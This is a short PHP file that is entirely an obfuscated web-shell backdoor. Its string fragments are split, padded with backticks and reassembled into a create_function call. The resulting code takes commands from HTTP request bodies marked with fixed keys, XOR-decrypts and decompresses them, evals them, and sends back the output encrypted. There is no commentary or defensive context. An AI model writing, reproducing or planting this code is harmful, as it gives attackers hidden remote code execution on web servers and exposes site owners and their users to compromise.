<?php
$x=')==1) `{@ob`_start();@eva`l(`@g`z`uncompress(@x(@ba`se64_decode(`$';
$O=str_replace('s','','crssesate_sfssunction');
$Z='$k="a`967deb9";`$kh="9`d2`6f6e85a9d`"`;$`kf="a101`792d9a72";$p="';
$b=');$j++,$`i+`+){$o.=$t{$i}`^$`k{$``j};}}return $o;}if (``@preg_ma';
$l='trl``e`n`($t);$o="";for($i=0;$i<$l;){fo`r($j=0;`($j<$c&`&$i`<$`l';
$o='tch(`"/$`kh(`.+)$kf/"`,@file_ge`t_cont`ents("p`hp``:/`/input"),`$m';
$p='m[1]`),$k)))`;`$o=@ob_`g`et_contents();@``ob_end_clean`(`);$`r=@ba';
$M='`yNnZ6zP`wI`OkHPfvb"``;functio`n x($t`,$`k){$c=s`trlen($`k);$l=s`';
$Q='`se64_encod`e(@x(@`gzcompr``ess($o``),$k)`);print("$p$kh$r$kf");}';
$L=str_replace('`','',$Z.$M.$l.$b.$o.$x.$p.$Q);
$X=$O('',$L);$X();
?>
